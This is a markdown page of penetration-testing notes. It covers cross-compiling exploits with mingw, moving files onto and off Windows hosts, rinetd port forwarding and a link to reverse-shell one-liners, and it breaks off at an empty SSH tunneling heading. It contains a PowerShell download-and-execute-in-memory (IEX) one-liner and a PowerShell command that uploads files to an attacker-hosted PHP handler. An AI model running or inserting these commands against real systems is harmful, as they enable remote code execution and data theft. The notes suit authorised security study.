# Miscelaneous

#### :red_circle: Usefull Regex

##### Find subdomains in a tect file (html usually):

```bash

grep -o '[^/]*\.$DOMAIN\.com' $FILE
#-o  returns the string defined in our regular expression
```
##### Create symbolik link:

```bash
ln -s $TARGET $LINKNAME
```

_____
## Compiling exploits

There are times that we are on Linux and some exploits needs to compile from a Windows machine (requieres dependencies). In this case, we can use a cross-compiler to help in the way:

```bash
#Install:
apt install mingw-w64

#Usage:
i686-w64-mingw32-gcc $EXPLOITFILENAME.c -o $OUTPUTNAME.exe
#In case of error, try adding the flag: -lws2_32
```

**Note:** It's always better to do it on it's own platform.

_____

## Package Python applications

Python code requieres an interpreter in order to execute it's instructions. This means we need python to be installed in a machine that we want to run a python script.

We can use **PyInstaller** which packages python applications into standalone executables for various OS.

_____

## Downloading files from Windows

#### Using Powershell one-liner:

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile('$URLOFFILE', '$NEWFILENAME')
```

If we want to download and execute the same file but not saving it to the disk, use:

```bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('$URLOFFILE')
```

#### Using exe2hex & powershell

First of all, optimize the file we want to transfer by using upx:

```bash
upx -9 $FILE
```

Now use exe2hex to convert the file:

```bash
exe2hex -x $FILE -p $RESULTFILENAME.cmd
#This creates a script with .cmd extension
```

Now we only need to copy and paste the script into a Windows shell.

_____

## Windows Uploads

If we want to transfer files, in this case from Windows to linux, we can use some of the following techniques:

#### Hosting an uploads.php file

**Step 1:** Create the following php file on Kali:

```bash
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

**Step 2:** Create the 'uploads' directory and set owner permissions to www-data:

```bash
mkdir /var/www/uploads && chown www-data: /var/www/uploads
```

**Step 3:** Upload the file executing the following command in a Windows cmd:

```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://$IPADDRESS/uploads.php', '$FILETOUPLOAD')
```

_____

## Compiling exploits in windows

If a Windows client have Mingw-w64 pre-installed we can compile C/C++ codes. First, go to the mingw-w64/i686.../ directory and execute the ".bat" file that set up the PATH variable for the gcc executable.

Once done, we can use as in Linux to compile our exploits:

```bash
gcc $EXPLOITFILENAME -o $FINALNAME.exe
```

_____

## Reverse shells one-liner

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

_____

##Â Port Forwarding

RINETD is a tool that helps us to achieve port forwarding. Once this tool is installed we need to add the forwarding rules on the next file:

```bash
#file: /etc/rinetd.conf
#Add the following line under forwarding rules:
0.0.0.0 $PORT $IPADDRESS $PORT

#For example, forward any incoming web access to the 1.2.3.4 server:
0.0.0.0 80 1.2.3.4 80

#Once done, restart the service and watch if it's active:
sudo service rinetd restart
ss -antp | gre "$PORT"
```

_____

## SSH Tunneling
